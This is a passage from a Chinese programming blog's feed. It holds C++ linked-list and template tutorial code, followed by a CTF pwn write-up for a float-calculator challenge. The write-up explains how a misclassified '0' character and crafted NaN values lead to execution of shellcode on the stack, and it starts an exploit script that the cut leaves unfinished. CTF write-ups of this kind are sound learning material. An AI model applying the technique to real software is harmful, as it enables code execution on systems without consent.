class="keyword">if</span> (p == <span class="literal">NULL</span> || p-&gt;next == <span class="literal">NULL</span>) &#123;   <span class="comment">//判断是否为空表，报异常</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;该链表为空表&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         ElemType * ptemp = <span class="literal">NULL</span>;      <span class="comment">//创建一个占位节点</span></span><br><span class="line">         p = p-&gt;next;</span><br><span class="line">         ptemp = p-&gt;next;              <span class="comment">//将头结点的下下个节点指向占位节点</span></span><br><span class="line">         delete p;                     <span class="comment">//删除头结点的下一个节点</span></span><br><span class="line">         p = <span class="literal">NULL</span>;</span><br><span class="line">         head-&gt;next = ptemp;           <span class="comment">//头结点的指针更换</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//测试函数</span></span><br><span class="line"> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     LinkList l;</span><br><span class="line">     <span class="type">int</span> i;</span><br><span class="line">     <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1.创建单链表   2.遍历单链表   3.获取单链表的长度   4.判断单链表是否为空   5.获取节点\n&quot;</span>;</span><br><span class="line">     <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;6.在尾部插入指定元素   7.在指定位置插入指定元素   8.在头部插入指定元素\n&quot;</span>;</span><br><span class="line">     <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;9.在尾部删除元素   10.删除所有元素   11.删除指定元素   12.在头部删除元素   0.退出&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     <span class="keyword">do</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要执行的操作: &quot;</span>;</span><br><span class="line">         <span class="built_in">cin</span> &gt;&gt; i;</span><br><span class="line">         <span class="keyword">switch</span> (i)</span><br><span class="line">         &#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">             <span class="type">int</span> n;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入单链表的长度: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">             l.CreateLinkList(n);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">             l.TravalLinkList();</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;该单链表的长度为&quot;</span> &lt;&lt; l.GetLength() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">             <span class="keyword">if</span> (l.IsEmpty() == <span class="number">1</span>)</span><br><span class="line">                 <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;该单链表是空表&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">                 <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;该单链表不是空表&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">             DataType data;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要获取节点的值: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; data;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;该节点的值为&quot;</span> &lt;&lt; l.Find(data)-&gt;data &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">             DataType endData;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要在尾部插入的值: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; endData;</span><br><span class="line">             l.InsertElemAtEnd(endData);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">             DataType pointData;</span><br><span class="line">             <span class="type">int</span> index;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要插入的数据: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; pointData;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要插入数据的位置: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; index;</span><br><span class="line">             l.InsertElemAtIndex(pointData, index);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">             DataType headData;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要在头部插入的值: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; headData;</span><br><span class="line">             l.InsertElemAtHead(headData);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">             l.DeleteElemAtEnd();</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">             l.DeleteAll();</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">             DataType pointDeleteData;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要删除的数据: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; pointDeleteData;</span><br><span class="line">             l.DeleteElemAtPoint(pointDeleteData);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">             l.DeleteElemAtHead();</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">default</span>:</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;<span class="keyword">while</span> (i != <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">     system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>在C++中，模板是一种强大的特性，它允许你编写与类型无关的代码。模板可以用于函数（函数模板）和类（类模板）。下面是一些函数模板和类模板的示例。</p><h3 id="函数模板示例"><a href="#函数模板示例" class="headerlink" title="函数模板示例"></a>函数模板示例</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数模板，用于交换两个值</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swapValues</span><span class="params">(T&amp; a, T&amp; b)</span> </span>&#123;</span><br><span class="line">    T temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">5</span>, b = <span class="number">10</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Before swap: a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; std::endl;</span><br><span class="line">    <span class="built_in">swapValues</span>(a, b);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;After swap: a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> x = <span class="number">3.14</span>, y = <span class="number">6.28</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Before swap: x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;, y = &quot;</span> &lt;&lt; y &lt;&lt; std::endl;</span><br><span class="line">    <span class="built_in">swapValues</span>(x, y);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;After swap: x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;, y = &quot;</span> &lt;&lt; y &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中，<code>swapValues</code> 是一个函数模板，它可以用来交换任何类型的两个值。</p><h3 id="类模板示例"><a href="#类模板示例" class="headerlink" title="类模板示例"></a>类模板示例</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 类模板，用于存储和打印元素</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Printer</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::vector&lt;T&gt; elements;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addElement</span><span class="params">(<span class="type">const</span> T&amp; element)</span> </span>&#123;</span><br><span class="line">        elements.<span class="built_in">push_back</span>(element);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">printElements</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; element : elements) &#123;</span><br><span class="line">            std::cout &lt;&lt; element &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        std::cout &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Printer&lt;<span class="type">int</span>&gt; intPrinter;</span><br><span class="line">    intPrinter.<span class="built_in">addElement</span>(<span class="number">1</span>);</span><br><span class="line">    intPrinter.<span class="built_in">addElement</span>(<span class="number">2</span>);</span><br><span class="line">    intPrinter.<span class="built_in">addElement</span>(<span class="number">3</span>);</span><br><span class="line">    intPrinter.<span class="built_in">printElements</span>();</span><br><span class="line"></span><br><span class="line">    Printer&lt;std::string&gt; stringPrinter;</span><br><span class="line">    stringPrinter.<span class="built_in">addElement</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    stringPrinter.<span class="built_in">addElement</span>(<span class="string">&quot;World&quot;</span>);</span><br><span class="line">    stringPrinter.<span class="built_in">printElements</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中，<code>Printer</code> 是一个类模板，它可以用来存储和打印任何类型的元素。</p><h3 id="模板特化示例"><a href="#模板特化示例" class="headerlink" title="模板特化示例"></a>模板特化示例</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通用函数模板</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">max</span><span class="params">(T a, T b)</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;General template&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> (a &gt; b) ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 特化函数模板，用于比较 const char* 类型</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span>* <span class="title">max</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* a, <span class="type">const</span> <span class="type">char</span>* b)</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Specialized template&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> (std::<span class="built_in">strcmp</span>(a, b) &gt; <span class="number">0</span>) ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">5</span>, b = <span class="number">10</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Max of &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; <span class="built_in">max</span>(a, b) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* x = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* y = <span class="string">&quot;banana&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Max of &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; <span class="built_in">max</span>(x, y) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中，我们为 <code>max</code> 函数模板提供了一个特化版本，专门用于比较 <code>const char*</code> 类型的字符串。</p><p>这些示例展示了C++模板的基本用法，包括函数模板、类模板和模板特化。模板是C++中实现泛型编程的关键特性，它允许你编写高度可重用的代码。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇blog是读者所总结（cv大法均有包含出处，笔者水平有限，如果错误请指出（主要期末考总结了一下方便考前再次复习&lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    <category term="总结" scheme="http://s1nec-1o.github.io/categories/%E6%80%BB%E7%BB%93/"/>
    
    <category term="C++" scheme="http://s1nec-1o.github.io/categories/%E6%80%BB%E7%BB%93/C/"/>
    
    
    <category term="开发" scheme="http://s1nec-1o.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>一些题目(format和ieee标准)</title>
    <link href="http://s1nec-1o.github.io/2024/05/03/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE-format%E5%92%8Cieee%E6%A0%87%E5%87%86/"/>
    <id>http://s1nec-1o.github.io/2024/05/03/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE-format%E5%92%8Cieee%E6%A0%87%E5%87%86/</id>
    <published>2024-05-03T11:24:30.000Z</published>
    <updated>2024-05-03T11:25:15.483Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h1><h1 id="float"><a href="#float" class="headerlink" title="float"></a>float</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">double</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE v6[<span class="number">12</span>]; <span class="comment">// [rsp+8h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+14h] [rbp-44h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">double</span> *v10; <span class="comment">// [rsp+20h] [rbp-38h]</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+28h] [rbp-30h]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line">  <span class="type">double</span> v13; <span class="comment">// [rsp+38h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v14; <span class="comment">// [rsp+40h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">400LL</span>);</span><br><span class="line">  s = v6;</span><br><span class="line">  v4 = alloca(<span class="number">64LL</span>);</span><br><span class="line">  buf = v6;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">0x180</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  qword_40E0 = s;                               <span class="comment">// 存栈地址</span></span><br><span class="line">  dword_4010 = <span class="number">0</span>;</span><br><span class="line">  sub_1384();</span><br><span class="line">  sub_14C9();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, buf, <span class="number">0x180</span>uLL);                <span class="comment">// 栈溢出</span></span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; <span class="number">47</span> )</span><br><span class="line">      v7 = <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7 &amp;&amp; *(buf + i) != <span class="string">&#x27;\n&#x27;</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(buf + i) &lt;= <span class="string">&#x27; &#x27;</span> || *(buf + i) &gt; <span class="string">&#x27;0&#x27;</span> )<span class="comment">// 0的情况未包括</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(buf + i) &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; *(buf + i) &lt;= <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( dword_4010 &gt; <span class="number">47</span> )                <span class="comment">// 只能运算48次</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++dword_4010;</span><br><span class="line">          v5 = qword_40E0;</span><br><span class="line">          *v5 = atof(buf + i);</span><br><span class="line">          qword_40E0 += <span class="number">8LL</span>;</span><br><span class="line">          <span class="keyword">while</span> ( *(buf + i + <span class="number">1</span>) == <span class="string">&#x27;.&#x27;</span> || *(buf + i + <span class="number">1</span>) &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; *(buf + i + <span class="number">1</span>) &lt;= <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;                                         <span class="comment">// 符号处理（0也包括在里面，导致漏洞</span></span><br><span class="line">        <span class="keyword">if</span> ( dword_4010 &lt;= <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = s;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">47</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = <span class="built_in">fabs</span>(*v10);</span><br><span class="line">          <span class="keyword">if</span> ( v13 != <span class="number">0.0</span> &amp;&amp; (v13 &lt; <span class="number">1.0</span> || v13 &gt; <span class="number">100.0</span>) )<span class="comment">// 不满足即可使用伪造NaN</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR: %lf\n&quot;</span>, v13);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++v10;</span><br><span class="line">        &#125;</span><br><span class="line">        (func_list[*(buf + i) - <span class="number">0x20</span>])();       <span class="comment">// 如果为0，会执行func_list[0x30 - 0x20]()</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( s &lt; qword_40E0 )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Result: %lf\n&quot;</span>, *(qword_40E0 - <span class="number">8</span>));<span class="comment">// 依靠ASCII码寻找到对应的函数</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当为0的时候就会有</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405031925682.png" alt="image-20240502170138697" style="zoom:50%;" /><p>而<code>qword_40E0 = s;</code> ，是栈上的指针，那么就会执行栈上的shellcode，现在只需要找到站上的shellcode是怎么回事即可</p><p>本题目的大概逻辑是：首先大体是一个浮点数计算的程序，它有着加减乘除的功能，它每读进一个数，就会将其保存在栈上，以IEEE浮点表示形式，其中每次读进的值要不满足<code>a!=0 &amp;&amp; (a&lt;1.0 || a&gt;100.0)</code>的条件，然而在判断a时，有一个纰漏便是在判断符号的时候将0也攘括进去了，因此导致了一个栈上shellcode的执行</p><p>动态调试的部分边省略，主要还是对上述的验证</p><p>IEEE标准的浮点形式的double型主要是1位的符号位，11位的指数位，52位的有效数，其中指数位是要再加上一个偏移1027即011111111111，例如1的浮点形式便是0 0111111111111 000000000…….00000000</p><p>而浮点形式的特殊情况便是NaN，表示0&#x2F;0等无意义的形式，其中</p><p>NaN 的两个特殊属性是：</p><ol><li><strong>与其他浮点数（包括 NaN 和 ±∞</strong> ）的比较结果：</li></ol><table><thead><tr><th>比较</th><th>NaN ≥ x</th><th>NaN ≤ x</th><th>NaN &gt; x</th><th>NaN &lt; x</th><th>NaN &#x3D; x</th><th>NaN ≠ x</th></tr></thead><tbody><tr><td>结果</td><td>False</td><td>False</td><td>False</td><td>False</td><td>False</td><td>True</td></tr></tbody></table><ol><li>它有许多可能的编码，允许它携带其他信息，例如指示 NaN 来源的诊断信息。例如：</li></ol><p>double-64 NaN：<code>s111 1111 1111 xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx</code> （其中<em>s</em>是符号，<em>x</em>序列表示非零数字（零值编码表示无穷大））</p><p>因此如果直接以NaN表示的话那个条件便是不成立的，就能直接构造shellcode</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">pc = <span class="string">&#x27;./fcalc&#x27;</span></span><br><span class="line">aslr = <span class="literal">True</span></span><br><span class="line">context.log_level = <span 